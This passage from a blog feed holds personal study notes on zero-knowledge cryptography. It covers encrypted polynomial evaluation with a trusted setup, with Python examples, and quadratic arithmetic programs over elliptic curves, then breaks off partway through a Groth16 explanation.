&lt;&#x2F;span&gt;&lt;span&gt;X &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# Verifier
&lt;&#x2F;span&gt;&lt;span&gt;left_hand_side &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;39&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;right_hand_side &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(X3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                              &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;neg&lt;&#x2F;span&gt;&lt;span&gt;(X2)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                              &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(X&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                              &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;neg&lt;&#x2F;span&gt;&lt;span&gt;(G1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;eq&lt;&#x2F;span&gt;&lt;span&gt;(left_hand_side&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;right_hand_side), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;lhs ≠ rhs&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;trusted-setup&quot;&gt;Trusted Setup&lt;&#x2F;h3&gt;
&lt;p&gt;Counterintuitively, we typically use the above construction in reverse.&lt;&#x2F;p&gt;
&lt;p&gt;For evaluation of the polynomial&lt;&#x2F;p&gt;
&lt;p&gt;$$
result = \sum_{i=0}^{d}c_i x^i
$$&lt;&#x2F;p&gt;
&lt;p&gt;we have a trusted third party generate a secret $\tau$ value and encrypt it as&lt;&#x2F;p&gt;
&lt;p&gt;$$
\tau[G],\ \tau^2[G],\ \tau^3[G]\ …\ \tau^d[G]
$$&lt;&#x2F;p&gt;
&lt;p&gt;And the prover will plug this into their polynomial with coefficients $c_i$&lt;&#x2F;p&gt;
&lt;p&gt;$$
[result] = c_0[G]+c_1[\tau G]+c_2[\tau^2 G]+…+c_d[\tau^d G]
$$&lt;&#x2F;p&gt;
&lt;p&gt;The &lt;code&gt;[result]&lt;&#x2F;code&gt; is the same value as if we had evaluated the polynomial directly:&lt;&#x2F;p&gt;
&lt;p&gt;$$
[result] = c_0[G]+c_1\tau [G]+c_2\tau^2 [G]+…+c_d\tau^d [G]
$$&lt;&#x2F;p&gt;
&lt;p&gt;The important point here is that we can evaluate polynomials using elliptic curve points and get a valid output, but without knowing the point we evaluated the polynomial at.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;polynomials-over-finite-fields&quot;&gt;polynomials over finite fields&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;py_ecc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;bn128 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;multiply&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;add&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;curve_order&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;eq&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;Z1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;functools &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;reduce
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;galois
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;initializing a large field, this may take a while...&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;GF = &lt;&#x2F;span&gt;&lt;span&gt;galois&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GF&lt;&#x2F;span&gt;&lt;span&gt;(curve_order)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;inner_product&lt;&#x2F;span&gt;&lt;span&gt;(ec_points&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;coeffs):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;reduce&lt;&#x2F;span&gt;&lt;span&gt;(add&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(point&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(coeff)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;point&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;coeff &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;zip&lt;&#x2F;span&gt;&lt;span&gt;(ec_points&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;coeffs))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;Z1)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;generate_powers_of_tau&lt;&#x2F;span&gt;&lt;span&gt;(tau&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;degree):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(tau &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;** &lt;&#x2F;span&gt;&lt;span&gt;i)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(degree &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# p = (x - 4) * (x + 2)
&lt;&#x2F;span&gt;&lt;span&gt;p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;galois&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Poly&lt;&#x2F;span&gt;&lt;span&gt;([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;field&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=GF&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;galois&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Poly&lt;&#x2F;span&gt;&lt;span&gt;([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;field&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=GF&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# evaluate at 8
&lt;&#x2F;span&gt;&lt;span&gt;tau &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GF&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# evaluate then convert
&lt;&#x2F;span&gt;&lt;span&gt;powers_of_tau &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;generate_powers_of_tau&lt;&#x2F;span&gt;&lt;span&gt;(tau&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;degree)
&lt;&#x2F;span&gt;&lt;span&gt;evaluate_then_convert_to_ec &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;p&lt;&#x2F;span&gt;&lt;span&gt;(tau)))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# evaluate via encrypted evaluation# coefficients need to be reversed to match the powers
&lt;&#x2F;span&gt;&lt;span&gt;evaluate_on_ec &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;inner_product&lt;&#x2F;span&gt;&lt;span&gt;(powers_of_tau&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;coeffs[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;::&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;eq&lt;&#x2F;span&gt;&lt;span&gt;(evaluate_then_convert_to_ec&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;evaluate_on_ec):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;elliptic curve points are equal&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;schwartz-zippel-lemma-and-the-motivation-for-encrypted-polynomial-evaluation&quot;&gt;Schwartz Zippel Lemma and the motivation for encrypted polynomial evaluation&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;em&gt;Pure copying. I think I need to understand it later&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The Schwartz-Zippel Lemma says that two unequal polynomials almost never overlap except at a number of points constrained by the degree. In a big prime finite field (i.e. a prime number with a couple hundred bits), the degree is going to be vanishingly small compared to the order of the field. So if we evaluate two different polynomials at a random point x and they evaluate to the same value, then we can be almost perfectly certain the two polynomials are the same &lt;em&gt;even if we don’t know the polynomials&lt;&#x2F;em&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;As it is, we have enough tooling for a prover to prove to the verifier that they have four polynomials 𝓐(x), 𝓑(x), 𝓒(x), and 𝓓(x) such that 𝓐𝓑 = 𝓒𝓓, and the verifier can certify this fact without learning the polynomials.&lt;&#x2F;p&gt;
&lt;p&gt;The prover will execute the encrypted evaluation of all four polynomials to obtain scalars A, B, C, and D and give that to the verifier. The verifier can then carry out AB = CD to see the prover’s claim is true. The prover doesn’t know what point they are evaluating at so they can’t architect polynomials that intersect at the point the third party setup chose (assuming no collusion).&lt;&#x2F;p&gt;
&lt;p&gt;Okay, we have AB = CD, but how is that useful?&lt;&#x2F;p&gt;
&lt;p&gt;This starts to get interesting when the verifier can require the prover to use a known polynomial for D. This is not enough for the verifier to learn A, B, or C, but it puts known constraints on what polynomials the prover can use for A, B, and C.&lt;&#x2F;p&gt;
&lt;p&gt;For example, one important feature is that the verifier now knows AB has the same roots (and possible others) as D because when polynomials are multiplied by a non-zero polynomial, the roots of the product polynomial is the union of the roots of the constituent polynomials. Therefore, the roots of polynomial 𝓓 must be a subset of the roots of 𝓐𝓑.&lt;&#x2F;p&gt;
&lt;p&gt;Another subtle way to constrain the verifier is to only supply them encrypted powers of x up to a limited power. This constrains the degree of the polynomial 𝓐𝓑.&lt;&#x2F;p&gt;
&lt;p&gt;A unknown polynomial with a known upper bound on the degree and a known set of roots is not unique, but nonetheless “says something” and can be used to encode information with some clever transformations. This should start to give you a foggy idea of how succinct zero knowledge proofs are possible.&lt;&#x2F;p&gt;
&lt;p&gt;Another teaser is that the setup ceremony “powers of tau” derives its name from creating a lot of powers of a hidden value so encrypted polynomials can be calculated from it, similar to what we described in this section.&lt;&#x2F;p&gt;
&lt;p&gt;The purpose of this article is only to introduce the concept of a trusted setup and encrypted polynomial evaluation, so we must stop here. But now that we know how to handle addition, multiplication, and exponentiation in an encrypted manner, we are ready to encode and encrypt arbitrary calculations, with the added bonus that we have a vague idea of how to make them succinct.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Quadratic Arithmetic Programs over Elliptic Curves</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-13/"/>
        <id>/blog/zknote/post-13/</id>
        
        <content type="html" xml:base="/blog/zknote/post-13/">&lt;h3 id=&quot;quadratic-arithmetic-programs-over-elliptic-curves&quot;&gt;Quadratic Arithmetic Programs over Elliptic Curves&lt;&#x2F;h3&gt;
&lt;p&gt;For a formula with $n$ constraints and $m$ dimensional witness variables, the stardardized QAP:&lt;&#x2F;p&gt;
&lt;p&gt;$$
\sum_{i=0}^{m}a_iu_i\left(x\right)\sum_{i=0}^{m}a_iv_i\left(x\right) = \sum_{i=0}^{m}a_iw_i\left(x\right)+h\left(x\right)t\left(x\right)
$$&lt;&#x2F;p&gt;
&lt;p&gt;Calculate it just like the encryption of polynomial evaluation in the previous chapter, we need a trusted setup with agent doing the trusted setup picks a random value $\tau$ and for the generators $G_1$ and $G_2$ creates&lt;&#x2F;p&gt;
&lt;p&gt;$$
\left\langle [\tau^0G_1]_1,\ [\tau^1G_1]_1,\ …,\ [\tau^{n-1}G_1]\right\rangle
$$&lt;&#x2F;p&gt;
&lt;p&gt;and apply it to every single subterm&lt;&#x2F;p&gt;
&lt;p&gt;$$
[u_i(\tau)]&lt;em&gt;1 = \sum&lt;&#x2F;em&gt;{j=0}^{m-1}u_{i,j}[\tau^jG_1]&lt;em&gt;1 = \left\langle u&lt;&#x2F;em&gt;{i,0},\ u_{i,1},\ …u_{i,n-1}\right\rangle \cdot \left\langle [\tau^0G_1]_1,\ [\tau^1G_1]_1,\ …,\ [\tau^{n-1}G_1]\right\rangle
$$&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;&lt;code&gt;·&lt;&#x2F;code&gt; notated hardmard product&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In the same way, we can also get&lt;&#x2F;p&gt;
&lt;p&gt;$$
[v_i\left(\tau\right)]&lt;em&gt;2 = \sum&lt;&#x2F;em&gt;{j=0}^{m-1}u_{i,j}[\tau^jG_2]&lt;em&gt;2 \
[w_i\left(\tau\right)]&lt;em&gt;1 = \sum&lt;&#x2F;em&gt;{j=0}^{m-1}u&lt;&#x2F;em&gt;{i,j}[\tau^jG_1]_1
$$&lt;&#x2F;p&gt;
&lt;p&gt;and then evaluating $h\left(\tau\right)t\left(\tau\right)$ using the methods already introduced: $t(x)$ is interpolated through zero points, and $h(x)$ is obtained by division&lt;&#x2F;p&gt;
&lt;p&gt;We don’t want to multiply the encrypted evaluation of h and t, since an encrypted evaluation would results in an elliptic curve point, this would force us to introduce a pairing to evaluate the multiplication of $h(τ)$ and $t(τ)$&lt;&#x2F;p&gt;
&lt;p&gt;Because t(x) is known at the setup phase, and we know it has a power of $n$ (it’s part of the definition of the circuit), the setup agent can do the following:&lt;&#x2F;p&gt;
&lt;p&gt;$$
\left\langle[r^0t\left(\tau\right)G_1]_1,\ [r^1t\left(\tau\right)G_1]_1,…,[r^nt\left(\tau\right)G_1]_1\right\rangle \
$$&lt;&#x2F;p&gt;
&lt;p&gt;after that we can compute&lt;&#x2F;p&gt;
&lt;p&gt;$$
h\left(\tau\right)t\left(\tau\right) = \left\langle h_1, h2, …, h_n\right\rangle · \left\langle[r^0t\left(\tau\right)G_1]_1,\ [r^1t\left(\tau\right)G_1]_1,…,[r^nt\left(\tau\right)G_1]_1\right\rangle
$$&lt;&#x2F;p&gt;
&lt;p&gt;We compute three elliptic curve points $[A]_1, [B]_2, [C]_1$ like in the chapter 10, and let prover do $pairing([A]_1,[B]_2) == pairing([C]_1,[G_2]_2)$, and accept if the equality is true.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Groth16 Explained</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-14/"/>
        <id>/blog/zknote/post-14/</id>
        
        <content type="html" xml:base="/blog/zknote/post-14/">&lt;h3 id=&quot;groth16-explained&quot;&gt;Groth16 Explained&lt;&#x2F;h3&gt;
&lt;p&gt;The groth16 algorithm enables a quadratic arithmetic program to be computed by a prover over elliptic curve points derived in a trusted setup, and quickly checked by a verifier. It uses auxiliary elliptic curve points from the trusted setup to prevent forged proofs.&lt;&#x2F;p&gt;
&lt;p&gt;In our chapter on evaluating a Quadratic Arithmetic Program at a hidden point τ, we had a significant issue that the prover can simply invent values a, b, c where ab = c and present those as elliptic curve points to the verifier.&lt;&#x2F;p&gt;
&lt;p&gt;Thus, the verifier has no idea if elliptic curve points $[A]_1$, $[B]_2$, and $[C]_1$ were the result of a satisfied QAP or made up values.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;preventing-forgery-using-a-and-b&quot;&gt;Preventing forgery using α and β&lt;&#x2F;h3&gt;
&lt;p&gt;update $[A]_1$ and $[B]_2$
$$
[A]_1 \leftarrow [A]_1 + [\alpha]_1 \
[B]_2 \leftarrow [B]_2 + [\beta]_2 \
$$
Naturally, the formula used for verification also needs to be modified.&lt;&#x2F;p&gt;
&lt;p&gt;For the original formula we have
$$
\sum_{i=0}^{m}a_iu_i\left(x\right)\sum_{i=0}^{m}a_iv_i\left(x\right) = \sum_{i=0}^{m}a_iw_i\left(x\right)+h\left(x\right)t\left(x\right)
$$&lt;&#x2F;p&gt;
&lt;p&gt;Substitute it into the modified formula to replace&lt;&#x2F;p&gt;
&lt;p&gt;$$
\left(\sum_{i=0}^{m}a_iu_i\left(x\right)+\alpha\right)\left(\sum_{i=0}^{m}a_iv_i\left(x\right)+\beta\right) = \alpha\beta+\beta\sum_{i=0}^{m}a_iu_i\left(x\right)+\alpha\sum_{i=0}^{m}a_iv_i\left(x\right)+\sum_{i=0}^{m}a_iu_i\left(x\right)\sum_{i=0}^{m}a_iv_i\left(x\right)
$$&lt;&#x2F;p&gt;
&lt;p&gt;thus we have
$$
\left(\sum_{i=0}^{m}a_iu_i\left(x\right)+\alpha\right)\left(\sum_{i=0}^{m}a_iv_i\left(x\right)+\beta\right) = \alpha\beta+\sum_{i=0}^ma_i\left(\beta u_i(x)+\alpha v_i(x)+w_i(x)\right)+h(x)t(x)
$$
That is the verification process that verifier needs to do, $pairing([A]_1, [B]_2)= pairing([\alpha]_1,[\beta]_2)+pairing([C]_1,G_2)$&lt;&#x2F;p&gt;
&lt;h3 id=&quot;separating-public-and-private-inputs-with-g-and-d&quot;&gt;separating public and private inputs with γ and δ&lt;&#x2F;h3&gt;
&lt;p&gt;how we split the QAP into the portions computed by the verifier (the public inputs) and the prover (the private inputs):
$$
\sum_{i=0}^{m}a_iw_i(x) = \sum_{i=0}^{\vartheta}a_iw_i(x) + \sum_{i=\vartheta+1}^{m}a_iw_i(x)
$$&lt;&#x2F;p&gt;
&lt;p&gt;thus our proving formula would be optimized:
$$
pairing([A]_1, [B]_2) = \
pairing([\alpha]_1,[\beta]_2)\&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;pairing(\sum_{i=0}^{\vartheta}a_i\left(\beta u_i(x)+\alpha v_i(x)+w_i(x)\right),G_2) + \sum_{i=\vartheta+1}^ma_i\left[\beta u_i(x)+\alpha v_i(x)+w_i(x)\right]_1+[h(x)t(x)]_1
$$&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;preventing-forgeries-with-public-inputs&quot;&gt;Preventing forgeries with public inputs&lt;&#x2F;h3&gt;
&lt;p&gt;To prevent this, the trusted setup agent divides w₀(τ) and w₁(τ) by a secret variable γ the prover portion by a different variable δ. The encrypted versions of these variables [γ] and [δ] are made available so that the verifier and prover can cancel them out if they are honest.&lt;&#x2F;p&gt;
&lt;p&gt;Verification step with γ and δ:&lt;&#x2F;p&gt;
&lt;p&gt;Instead of pairing with G₂ at the verification step, we pair with [γ] and [δ], The [γ] and [δ] terms will cancel out if the prover truly used the polynomials from the trusted setup. The prover (and verifier) do not know the field element that corresponds to [δ], so they cannot cause the terms to cancel out unless they use the values from the trusted setup.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;enforcing-true-zero-knowledge-r-and-s&quot;&gt;Enforcing true zero knowledge: r and s&lt;&#x2F;h3&gt;
